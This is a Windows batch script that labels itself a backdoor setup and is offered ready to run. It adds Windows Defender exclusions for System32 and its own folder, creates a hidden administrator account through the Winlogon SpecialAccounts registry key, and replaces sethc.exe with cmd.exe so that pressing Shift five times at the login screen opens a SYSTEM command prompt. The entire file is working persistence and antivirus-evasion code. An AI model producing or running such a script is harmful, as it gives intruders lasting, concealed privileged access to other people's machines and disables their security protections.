@echo off
setlocal EnableDelayedExpansion

echo [*] Starting backdoor setup...

:: === CONFIGURATION ===
:: !! IMPORTANT: This script MUST be run as Administrator !!
set "USERNAME=hiddenuser" :: Make sure this matches the username you intend to use
set "SETHC_BACKUP=C:\Windows\System32\sethc.bak"
set "SETHC_TARGET=C:\Windows\System32\sethc.exe"
set "CMD_SOURCE=%~dp0sethc.exe" :: Assumes a copy of cmd.exe named sethc.exe is in script's folder

echo [*] Setting up for user: %USERNAME%

:: Check if the source CMD file exists
if not exist "%CMD_SOURCE%" (
    echo [!] ERROR: Source file "%CMD_SOURCE%" not found!
    echo [!] Please copy cmd.exe to this folder and rename it to sethc.exe.
    goto :end
)

:: === 1. Add Windows Defender exclusions ===
echo [*] Adding Windows Defender exclusions for script folder, System32, and %SETHC_TARGET%...
:: Need elevated privileges for these commands
powershell -Command "Add-MpPreference -ExclusionPath '%cd%'" >nul 2>&1
if %errorlevel% neq 0 echo [!] WARNING: Could not add Defender exclusion for current directory. (%errorlevel%)

powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32'" >nul 2>&1
if %errorlevel% neq 0 echo [!] WARNING: Could not add Defender exclusion for System32. (%errorlevel%)

powershell -Command "Add-MpPreference -ExclusionPath '%SETHC_TARGET%'" >nul 2>&1
if %errorlevel% neq 0 echo [!] WARNING: Could not add Defender exclusion for %SETHC_TARGET%. (%errorlevel%)

echo [✓] Defender exclusions added (or attempted).


:: === 2. Backup original sethc.exe ===
echo [*] Backing up original %SETHC_TARGET%...
:: Need elevated privileges for these commands
if exist "%SETHC_TARGET%" (
    :: Check if backup already exists
    if not exist "%SETHC_BACKUP%" (
        copy /Y "%SETHC_TARGET%" "%SETHC_BACKUP%" >nul
        if %errorlevel% neq 0 (
            echo [!] WARNING: Failed to backup %SETHC_TARGET%. Permission issue? (%errorlevel%)
        ) else (
            echo [✓] Backup created: %SETHC_BACKUP%.
        )
    ) else (
        echo [!] Backup file %SETHC_BACKUP% already exists. Skipping backup.
    )
) else (
    echo [!] WARNING: Original %SETHC_TARGET% not found. Skipping backup.
)


:: === 3. Create hidden admin account ===
:: Prompt for password input - Moved here after exclusions
set /p userPassword=Enter the password for the new hidden user account (%USERNAME%): 

echo [*] Creating user account "%USERNAME%"...
:: Need elevated privileges
net user "%USERNAME%" %userPassword% /add >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] WARNING: Could not create user "%USERNAME%". May already exist? (%errorlevel%)
    :: Check if user creation failed critically before proceeding with group/reg key
    :: You might want to add a GOTO :end here if user creation is essential
) else (
    echo [✓] User "%USERNAME%" created.
)

echo [*] Adding user "%USERNAME%" to Administrators group...
net localgroup administrators "%USERNAME%" /add >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] WARNING: Could not add user "%USERNAME%" to Administrators. (%errorlevel%)
) else (
     echo [✓] User "%USERNAME%" added to Administrators.
)

echo [*] Hiding user "%USERNAME%" from login screen...
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "%USERNAME%" /t REG_DWORD /d 0 /f >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] WARNING: Could not add registry key for hiding user. (%errorlevel%)
) else (
    echo [✓] Registry key added for hiding "%USERNAME%".
)


:: === 4. Modify sethc.exe ===
echo [*] Replacing %SETHC_TARGET% with %CMD_SOURCE%...
:: Need elevated privileges. Take ownership and grant permissions before replacing protected file
echo [*] Taking ownership of %SETHC_TARGET%...
takeown /F "%SETHC_TARGET%" >nul 2>&1
if %errorlevel% neq 0 echo [!] WARNING: Failed to take ownership. (%errorlevel%)

echo [*] Granting Administrators full control on %SETHC_TARGET%...
icacls "%SETHC_TARGET%" /grant administrators:F >nul 2>&1
if %errorlevel% neq 0 echo [!] WARNING: Failed to grant permissions. (%errorlevel%)

:: Now attempt the copy
copy /Y "%CMD_SOURCE%" "%SETHC_TARGET%" >nul
if %errorlevel% neq 0 (
    echo [!] CRITICAL ERROR: Failed to replace %SETHC_TARGET% with %CMD_SOURCE%. (%errorlevel%)
    echo [!] Check permissions or if TrustedInstaller still owns the file.
) else (
    echo [✓] Successfully replaced %SETHC_TARGET%.
)

:: Note: Broader temporary exclusions (%cd%, C:\Windows\System32) are added in Step 1.
:: If you only wanted the sethc.exe exclusion to persist, you would remove the broader ones here.
:: For a robust setup that might involve placing other tools alongside the script, keeping the %cd%
:: exclusion might be desirable. Keeping the System32 exclusion is usually unnecessary and risky.
:: If you want to remove the System32 exclusion specifically:
:: echo [*] Cleaning up unnecessary System32 exclusion...
:: powershell -Command "Remove-MpPreference -ExclusionPath 'C:\Windows\System32'" >nul 2>&1


echo.
echo [✓] Setup complete.
echo.
echo You should now be able to press Shift 5 times at the login screen
echo to launch a Command Prompt (running as SYSTEM, with admin rights).
echo The user "%USERNAME%" is created but hidden.
echo.

:end
pause